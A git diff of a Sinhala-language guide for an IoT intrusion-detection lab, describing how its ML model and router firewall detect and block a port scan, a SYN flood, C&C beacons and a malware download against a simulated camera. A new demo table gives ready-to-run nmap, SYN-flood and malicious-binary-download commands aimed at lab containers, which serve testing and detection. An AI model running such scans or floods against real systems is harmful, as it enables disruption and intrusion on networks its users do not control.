+7. **ප්‍රතිඵලය:** Dashboard එකේ තැඹිලි පාට "PortScan" badge එක සජීවීව වැටේ.
+
+---
+
+### උදාහරණ C: DDoS SYN Flood ප්‍රහාරයක් එල්ල වන වෙලාව (Scenario 3)
+
+1. Attacker (`10.10.10.50`) කැමරාවේ Port 80 වෙත තත්පරයට packets 1,000 ක SYN flood එකක් එල්ල කරයි.
+2. කැමරාවේ Web buffer එක පිරී යාමට උත්සාහ කරයි.
+3. Zeek ලියයි: `conn_state: "S0"`, `orig_pkts` අතිවිශාල ලෙස වැඩිවේ, `resp_bytes: 0`.
+4. Adapter එක features 27 ක් හදයි: packet rate සහ flow frequency අතිශය ඉහළයි.
+5. Model v3.1.0 එක කියයි: `predicted_class = "DDoS_DoS"`, `confidence = 0.93`.
+6. Decision Engine (Rule D-055): Attacker source එක Router එකේ Rate-Limit ලැයිස්තුවට දමයි.
+7. **ප්‍රතිඵලය:** Flood එක පාලනය වන අතර කැමරාවේ NVR වීඩියෝව (Port 554) සහ Admin UI බිඳ නොවැටී සුරක්ෂිත වේ.
+
+---
+
+### උදාහරණ D: C&C Botnet Beacons ප්‍රහාරයක් එල්ල වන වෙලාව (Scenario 4)
 
 1. ආසාදිත කැමරාව (`192.168.50.30`) පිටත ඇති C&C server එක (`10.10.10.50:6667`) වෙත සම්බන්ධ වීමට outbound botnet beacons යවයි.
 2. C&C server එක ආරම්භක තත්පර 120 තුළ වසා ඇති බැවින් එම සම්බන්ධතා ප්‍රතික්ෂේප වේ (Reject - `REJ`).
@@ -1931,8 +2221,18 @@ SOC Dashboard එකේ වම්පස මෙනුවේ **"Devices & Scans"**
 4. Adapter එක features 27 ක් හදයි: `pair_fail_1h = 7` (පැය තුළ අසාර්ථක උත්සාහ 7 කි).
 5. Model v3.1.0 එක කියයි: `predicted_class = "CnC"`, `confidence = 0.91`.
 6. Decision Engine: කැමරාව Local Subnet එකේ බැවින් ආරක්ෂිතයි, පිටත destination එක වන `10.10.10.50` block කිරීමට අනුමත කරයි.
-7. Router Adapter: SSH මඟින් router එකට ගොස් `10.10.10.50` Drop list එකට (`block_dst`) දමයි.
+7. Router Adapter: SSH මඟින් router එකට ගොස් `10.10.10.50` Drop list එකට (`block_dst`) දමයි (30-min auto-expiry).
 8. **ප්‍රතිඵලය:** කැමරාවට පිටත C&C server එක හා සම්බන්ධ වීම අවහිර වේ. Dashboard එකේ රතු alert එක වැටේ. කැමරාවේ වීඩියෝව Local NVR එකට සාමාන්‍ය පරිදි ගලා යයි.
+
+---
+
+### උදාහරණ E: Malware Download ප්‍රහාරයක් එල්ල වන වෙලාව (Scenario 5)
+
+1. ආසාදිත කැමරාව පිටත Attacker Web Server එකෙන් (`10.10.10.50/bins/lab_test.x86`) binary executable එකක් බාගත කරයි.
+2. Zeek HTTP Analyzer එක URI එක සහ MIME type එක (`application/x-executable`) කියවයි.
+3. Rule Engine: `RULE_EXECUTABLE_DOWNLOAD` නීතිය ක්‍රියාත්මක වේ. Model v3.1.0: `Malware_Download` class.
+4. Decision Engine: Table 10 Row 5 අනුව, කැමරාව block නොකර අධිකරණමය සාක්ෂි (Forensic Evidence) සටහන් කරයි.
+5. **ප්‍රතිඵලය:** Dashboard එකේ Forensic Alert එකක් සටහන් වේ. පරිපාලකයාට අවශ්‍ය නම් Manual Block කළ හැක.
 
 ---
 
@@ -2025,3 +2325,19 @@ docker exec ids-lab-router nft list set inet ids block_dst
 ### පියවර 5: කැමරාව දිගටම ක්‍රියාත්මක බව පෙන්වීම (Camera Stream Survival)
 
 > *"Most importantly Sir, our camera was never blocked. The NVR continues recording its video stream uninterrupted, proving that legitimate camera operations survive while the attacker is stopped."*
+
+---
+
+### පියවර 6: වෙනත් ඕනෑම ප්‍රහාරයක් Supervisor ඉල්ලුවහොත් ක්ෂණිකව පෙන්වීමට (Alternative Live Attacks Quick Reference)
+
+Supervisor විසින්: *"Can you show me a PortScan or a DDoS attack right now?"* කියා ඇසුවහොත්, පහත විධානයන් කෙලින්ම Terminal එකේ ධාවනය කර පෙන්වන්න:
+
+| ප්‍රහාරක වර්ගය (Attack Type) | Terminal එකේ ගසන Command එක (Direct Manual Execution) | ML Model & Firewall ප්‍රතිචාරය | Dashboard හි පෙනෙන ආකාරය |
+| :--- | :--- | :--- | :--- |
+| **1. PortScan (Scenario 2)** | `docker exec ids-lab-attacker nmap -p 80,554 192.168.50.30` | `PortScan` class ($P \ge 0.85$), Camera not blocked | Live Alerts හි තැඹිලි පාට Reconnaissance Badge |
+| **2. DDoS SYN Flood (Scenario 3)** | `docker exec ids-lab-attack-server python -u /lab/syn_flood.py 192.168.50.30 --port 80 --rate 1000 --seconds 20` | `DDoS_DoS` class, Router Rate-Limits Attacker (D-055), NVR Stream Survives | Live Alerts හි රතු පාට DDoS Badge, Rate-Limit Mitigations |
+| **3. C&C Botnet Beacons (Scenario 4)** | `docker exec -d ids-lab-attack-server python -u /lab/lab_server.py --role cnc --cnc-open-after 120`<br>`docker exec -d ids-lab-camera python -u /lab/camera_sim.py bot --server 10.10.10.50 --every 5 --session 30 --duration 90` | `CnC` class ($P = 0.91$), Router nftables drops `10.10.10.50` (`block_dst`) for 1800s | Live Alerts හි රතු පාට CnC Badge, Mitigations හි Auto-Expiry Countdown |
+| **4. Malware Download (Scenario 5)** | `docker exec ids-lab-camera python -u /lab/camera_sim.py download --url http://10.10.10.50/bins/lab_test.x86 --count 5 --every 20` | `Malware_Download` class, Executable Signature Alert, Forensic Evidence logged | Live Alerts හි කහ පාට Malware Payload Warning |
+| **5. Manual Block / Unblock (Scenario 6)** | Dashboard UI (`http://localhost:5000/mitigations`) හෝ REST API මඟින් Block/Unblock කිරීම | Router nftables `block_src` update වීම, System Audit log සටහන් වීම | Mitigations වගුව ක්ෂණිකව update වීම, Audit Trail සටහන |
+
+*(සවිස්තරාත්මක විස්තර, Zeek logs පරීක්ෂා කිරීම්, සහ Kernel nftables තහවුරු කිරීම් සඳහා ඉහත **[Section 4.3](#43-විවිධ-ප්‍රහාර-වර්ග-අතින්-commands-ගසා-සජීවීව-පෙන්වීමේ-ප්‍රායෝගික-අත්පොත-hands-on-manual-attack-execution-ml-detection-firewall-response--dashboard-telemetry-playbook)** බලන්න).*
